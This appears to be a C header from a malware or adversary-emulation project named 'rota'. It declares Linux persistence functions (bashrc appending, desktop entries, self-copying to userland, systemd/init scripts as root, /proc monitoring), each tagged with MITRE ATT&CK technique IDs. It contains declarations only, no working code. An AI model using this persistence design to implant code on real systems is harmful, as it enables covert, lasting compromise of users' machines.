#ifndef PERSISTENCE_H_
#define PERSISTENCE_H_
#include <stdbool.h>


/**
* @brief append to bashrc for persistence
* Technique: Event Triggered Execution: Unix Shell Configuration Modification (T154.004)
* @param: N/A
* @return: boolean indicating success/failue of file creation.
**/

bool nonroot_bashrc_persistence(void);

/**
* @brief append to bashrc for persistence
* Technique: Desktop Entry (not documented in ATT&CK)
* @param: N/A
* @return: boolean indicating success/failue of file creation.
**/
bool nonroot_desktop_persistence(void);

bool copy_rota_to_userland(void);

/**
 * @brief wrapper function to call additional non-root persistence functions
 * @param N/A
 * @return boolean value indicating success or failureof non-root persistence methods.
*/
bool nonroot_persistence(void);

/**
 * @brief Leverage systemd/init rc scripts to achieve persistence when rota is executed as root.
 * Technique: Boot or Logon Initiaization Scripts
 * TID: 1037.004
 * https://attack.mitre.org/techniques/T1037/
 * @param N/A
 * @return boolean value if successfully installed persistence.
 **/
bool root_persistence(void);


/**
*
* @brief monitor /proc/<PID> for existence of a given process.
* @param pid, integer value corresponding to a given process.
* @return boolean value indicating file in proc exists or not.
**/
bool monitor_proc(int pid);

/**
 * @brief helper function to write data to disk
 * @param fpath char pointer to location on filepath.
 * @param data, buffer of data to write to previously specified filepath.
 * @return boolean value indicating success or failure.
 * */
bool write_to_file(char *fpath, char *data);

#endif // PERSISTENCE_H_
